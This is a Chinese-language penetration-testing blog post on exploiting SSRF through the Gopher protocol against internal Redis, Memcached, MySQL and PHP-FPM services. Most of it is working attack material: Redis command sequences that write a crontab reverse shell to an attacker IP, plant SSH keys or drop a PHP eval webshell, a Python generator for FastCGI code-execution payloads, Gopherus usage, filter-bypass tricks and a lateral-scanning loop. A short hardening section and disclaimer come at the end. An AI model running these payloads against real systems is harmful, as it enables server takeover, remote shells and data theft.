---
title: 'SSRF：Gopher协议深度利用'
date: 2025-10-18 05:54:05
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
description: SSRF Gopher 协议深度利用——构造 GET/POST 请求攻击内网 Redis/Memcached/MySQL/FastCGI 与 gopherus 自动化。
---

## 前言

SSRF（Server-Side Request Forgery）是渗透测试中常见的高危漏洞。在众多利用手法中，**Gopher 协议**因能构造任意 TCP 数据流，成为最强大的攻击载体之一。本文深入剖析 Gopher 协议在 Redis、Memcached、MySQL、FastCGI 等内网服务中的攻防实践。

## 一、Gopher 协议格式详解

Gopher 协议定义于 RFC 1436，其 URL 格式如下：

```
gopher://<host>:<port>/<gopher-type><selector>%0d%0a<next-type><next-selector>%0d%0a...
```

核心要点：
- **`gopher-type`**：单字符表示资源类型，`_` 表示任意数据。
- **`%0d%0a`**：URL 编码的 CRLF（`\r\n`），分隔多段数据，使得单条 Gopher URL 可发送完整的 TCP 会话。
- **Selector 之后的内容原样发送到目标端口**，不附加任何额外头部（与 HTTP 截然不同）。

description: SSRF Gopher 协议利用——构造 GET/POST 请求攻击内网 Redis/MySQL/FastCGI。
SSRF 利用条件：服务端使用 libcurl 且未禁用 Gopher 协议（curl 7.45.0+ 默认开启）。PHP 的 curl 扩展支持；Java 原生 `URL` 类不支持。发送一次 URL 编码通常足够；若中间件再解码，则需二次编码。

## 二、通过 Gopher 构造 GET/POST 请求

空格→`%20`、换行→`%0d%0a`、`&`→`%26`。头部以 `%0d%0a%0d%0a` 结束。GET 请求示例：

```
gopher://internal:80/_GET%20/api/info%20HTTP/1.1%0d%0aHost:%20internal%0d%0a%0d%0a
```

POST 请求需添加 `Content-Type` 和 `Content-Length`，body 紧随双 CRLF：

```
gopher://internal:80/_POST%20/api/login%20HTTP/1.1%0d%0aHost:%20internal%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2019%0d%0a%0d%0ausername=admin%26pwd=1%0d%0a%0d%0a
```

辅助编码脚本：

```python
import urllib.parse

def gen_gopher(host, port, raw_bytes):
    encoded = urllib.parse.quote(raw_bytes, safe='')
    return f"gopher://{host}:{port}/_{encoded}"

# 示例
print(gen_gopher("127.0.0.1", 6379, b"*1\r\n$4\r\nPING\r\n"))
```

## 三、攻击内网 Redis

Redis 使用 RESP 协议：`*<参数数量>\r\n$<参数长度>\r\n<参数>\r\n`。例如 `SET k v` → `*3\r\n$3\r\nSET\r\n$1\r\nk\r\n$1\r\nv\r\n`。默认 `0.0.0.0:6379` 无密码的 Redis 是 SSRF 高价值目标。

### 3.1 探测与信息收集

```text
# PING 探测
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a

# 遍历 db 并获取所有键
*2\r\n$6\r\nSELECT\r\n$1\r\n0\r\n
*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n
*2\r\n$3\r\nGET\r\n$3\r\nkey\r\n
```

### 3.2 写 Crontab 获取反弹 Shell（需 root 权限）

命令序列：
```text
flushall
set x "\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

关键 RESP 片段（`set x` 的 value 中 `\n` 前后的换行不可省略）：

```
*4\r\n$3\r\nset\r\n$1\r\nx\r\n$62\r\n\n* * * * * bash -i >& /dev/tcp/10.10.10.1/4444 0>&1\n\r\n
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$17\r\n/var/spool/cron/\r\n
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n
*1\r\n$4\r\nsave\r\n
```

> 系统差异：CentOS 路径 `/var/spool/cron/root`；Ubuntu 为 `/var/spool/cron/crontabs/root`。

### 3.3 写 SSH 公钥（需 root 权限）

```text
flushall
set x "\nssh-rsa AAAAB3NzaC1yc2E... attacker@kali\n"
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

前提：`/root/.ssh/` 目录存在且 SSH 允许公钥认证。

### 3.4 写 Webshell

```text
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save
```

适用于已知 Web 根目录且 Redis 有写权限的场景。

## 四、Memcached 利用

Memcached 默认 `11211` 端口，文本协议无认证。格式简单直接：

```text
# 查询状态
stats\r\n

# 枚举 slab 并 dump 缓存键
stats items\r\n
stats cachedump <slab_id> <limit>\r\n
get <key>\r\n

# 写入数据
set <key> <flags> <exptime> <bytes>\r\n<data>\r\n
```

Gopher 示例——写入缓存：

```
gopher://127.0.0.1:11211/_set%20test%200%203600%205%0d%0ahello%0d%0a
```

实际利用价值：
- **Session 投毒**：覆盖应用存储在 Memcached 中的会话实现越权。
- **缓存投毒**：修改页面缓存注入恶意 JS。
- **信息泄露**：读取 Token、API Key 等敏感数据。

## 五、MySQL 协议走私

MySQL 通信使用二进制协议（服务端握手 → 客户端认证 → 查询交互）。SSRF 中通常无密码，绕过思路：

- **Pre-Auth 利用**：MySQL < 5.7 时，可在握手完成前发送查询包。
- **已知凭据场景**：若有泄露凭据，构造 `mysql_native_password` 认证哈希（对密码和 salt 做双重 SHA1 后 XOR），然后发送 `COM_QUERY`（`0x03` + SQL 语句）包。
- **实战建议**：MySQL 二进制协议手搓复杂，推荐用 Wireshark 抓取正常会话 hex dump 后转 Gopher，或直接用 gopherus。

## 六、FastCGI（PHP-FPM）攻击

PHP-FPM 默认监听 `127.0.0.1:9000`，通过 FastCGI 二进制协议控制 PHP 执行。核心思路：通过 `PHP_VALUE` 设置 `auto_prepend_file = php://input`，将 `STDIN` 中的内容作为 PHP 代码执行。

### 6.1 数据包结构

```
+-------+------+----------+-----------+------+--------+
| Ver(1)|Type(1)|ReqID(2) |ContLen(2) |Pad(1)|Rsvd(1) | Content...
+-------+------+----------+-----------+------+--------+
```

关键 Type：`1`=BEGIN_REQUEST，`4`=PARAMS，`5`=STDIN。

### 6.2 构造利用载荷

```python
import struct, urllib.parse

def fcgi_packet(ptype, req_id, content):
    clen = len(content)
    plen = (8 - (clen % 8)) % 8
    hdr = struct.pack('!BBHHBB', 1, ptype, req_id, clen, plen, 0)
    return hdr + content + b'\x00' * plen

def encode_params(params):
    raw = b""
    for k, v in params.items():
        for b in [k.encode(), v.encode()]:
            raw += (bytes([len(b)]) if len(b) < 128 else struct.pack('!BI', 0x80, len(b)))
        raw += k.encode() + v.encode()
    return raw

def gen_fastcgi_gopher(host, port, php_path, php_code):
    rid = 1
    begin = fcgi_packet(1, rid, b'\x00\x01\x01\x00\x00\x00\x00\x00')
    params = encode_params({
        'SCRIPT_FILENAME': php_path, 'SCRIPT_NAME': php_path,
        'REQUEST_METHOD': 'POST',
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On',
        'CONTENT_LENGTH': str(len(php_code)),
        'CONTENT_TYPE': 'application/x-www-form-urlencoded',
    })
    raw = begin + fcgi_packet(4, rid, params) + fcgi_packet(4, rid, b"")
    raw += fcgi_packet(5, rid, php_code.encode()) + fcgi_packet(5, rid, b"")
    return f"gopher://{host}:{port}/_{urllib.parse.quote(raw, safe='')}"

# 使用
print(gen_fastcgi_gopher("127.0.0.1", 9000,
    "/var/www/html/index.php", "<?php system('id');die();?>"))
```

关键：`SCRIPT_FILENAME` 必须指向目标服务器上真实存在的 PHP 文件（任意文件均可）。`CONTENT_LENGTH` 必须与实际 body 长度一致，否则 PHP-FPM 会等待更多数据导致超时。

## 七、gopherus 自动化工具

Gopherus 是专为 SSRF 设计的 Gopher 载荷生成器，覆盖 MySQL(3306)、PostgreSQL(5432)、FastCGI(9000)、Redis(6379)、SMTP(25)、Zabbix(10050)、Memcached(11211)。

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus && pip install -r requirements.txt
```

**Redis 示例**——选择 Attack Mode 1 (crontab) 或 2 (SSH Key)，输入 HOST/PORT/Attacker IP 即可输出 Gopher URL：

```text
$ python gopherus.py --exploit redis
Give Server HOST: 10.10.10.10
Give Server PORT: 6379
Give Attacker IP: 10.10.10.1
Give Attacker PORT: 4444
Your choice: 1
Your gopher link is Ready:
gopher://10.10.10.10:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
```

**FastCGI 示例**——指定 PHP 文件路径和要执行的命令：

```text
$ python gopherus.py --exploit fastcgi
Give a PHP file location: /var/www/html/index.php
Enter Command to execute: id
```

**局限性**：crontab 路径硬编码为 CentOS 默认值；MySQL 模块需已知凭据；复杂 WAF 场景需手动调整 payload。

## 八、URL 编码与绕过技巧

### 8.1 编码层次判断

SSRF 中的解码链条：应用层 `urldecode()` → 中间件（Nginx rewrite）→ curl Gopher 引擎。利用时按层次增加编码次数：

| 场景 | 编码次数 |
|------|----------|
| payload 直接拼入 curl 命令 | 1 次 |
| 含中间件 URL 重写解码 | 2 次 |
| 应用 `urldecode()` + `curl_exec()` | 3 次 |

多层编码脚本：

```python
import urllib.parse

def multi_encode(payload, times=1):
    for _ in range(times):
        payload = urllib.parse.quote(payload, safe='')
    return payload
```

### 8.2 CRLF 绕过

| 变体 | 表示 |
|------|------|
| 标准 URL 编码 | `%0d%0a` |
| 二次编码 | `%250d%250a` |
| 大小写混用 | `%0D%0A` |
| 仅 LF（部分 Redis 版本接受） | `%0a` |
| Unicode | `%u000d%u000a` |

### 8.3 更多绕过手段

- **302 跳转**：VPS 部署 302 指向 `gopher://`，利用自动跳转绕过协议白名单。
- **DNS 重绑定**：TTL=0 域名在两轮解析间切换 IP 绕过内网黑名单。
- **进制混淆**：`127.0.0.1` → `2130706433`（十进制）、`0x7f000001`（十六进制）、`0177.0.0.1`（八进制混合）。
- **IPv6 映射**：`[::ffff:127.0.0.1]` 在部分解析库中等同 `127.0.0.1`。
- **短链接包装**：将 Gopher URL 存入短链接服务，绕过 URL 格式校验。

## 九、完整攻击链示例

**场景**：Web 应用 `?url=` 参数存在 SSRF，后端使用 curl。

**第一步 — 内网探测**：
```text
# 探测 Redis
?url=http://127.0.0.1:6379/        → 超时 = 端口开放
# 探测 FastCGI
?url=http://127.0.0.1:9000/        → 502 = PHP-FPM 存在
```

**第二步 — Redis 写 crontab**：
构造 3.2 节的 Gopher payload，写入定时任务获取反弹 Shell。

**第三步 — 横向移动**：
```bash
for i in $(seq 1 254); do
    curl -sm1 http://192.168.1.$i:80/ && echo "192.168.1.$i"
done
```

**推荐工具链**：Gopherus（载荷生成）、SSRFmap（自动化利用）、httpx（内网探测）、Burp Collaborator（Blind SSRF 检测）。

## 十、防御与加固

**开发侧**：
- curl 限制协议：`CURLOPT_PROTOCOLS` 仅允许 `HTTP | HTTPS`；`CURLOPT_REDIR_PROTOCOLS_STR` 限制重定向协议。
- 关闭自动跳转：`CURLOPT_FOLLOWLOCATION = false`。
- DNS 解析后校验 IP，拒绝内网地址（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.0/8`）。

```php
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS_STR, "http,https");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
```

**运维侧**：
- Redis：`requirepass` 强密码 + `bind 127.0.0.1` + `rename-command FLUSHALL ""`。
- PHP-FPM：`listen = 127.0.0.1:9000` 不暴露公网。
- MySQL：最小权限 + `local_infile=OFF`。
- Memcached：`-l 127.0.0.1` + 防火墙过滤 `11211`。

## 免责声明

本文内容仅供安全研究与学习交流，严禁用于未授权测试。任何因不当使用本文技术导致的后果由使用者自行承担。安全测试前请务必获得目标系统所有者的书面授权，并遵守《中华人民共和国网络安全法》及相关法律法规。

## 参考资料

- [RFC 1436 - The Internet Gopher Protocol](https://datatracker.ietf.org/doc/html/rfc1436)
- [Gopherus - SSRF Exploitation Tool](https://github.com/tarunkant/Gopherus)
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [FastCGI Specification](https://fastcgi-archives.github.io/FastCGI_Specification.html)
- [Redis RESP Protocol](https://redis.io/docs/latest/develop/reference/protocol-spec/)
- [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)
